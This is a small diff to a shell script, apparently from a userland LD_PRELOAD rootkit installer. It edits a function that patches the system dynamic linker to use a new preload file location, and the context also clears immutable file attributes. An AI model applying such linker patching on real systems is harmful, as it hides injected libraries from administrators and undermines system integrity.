@@ -36,7 +36,7 @@ chattr -ia children &>/dev/null; rm -f children output
 
 patch_dynamic_linker ()
 {
-    misc/patch_ld.py $NEW_PRELOAD
+    misc/patch_ld.py # $NEW_PRELOAD - will add changeable new file location when i can test my changes
     NEW_PRELOAD=$(cat new_preload)
     rm new_preload
 }
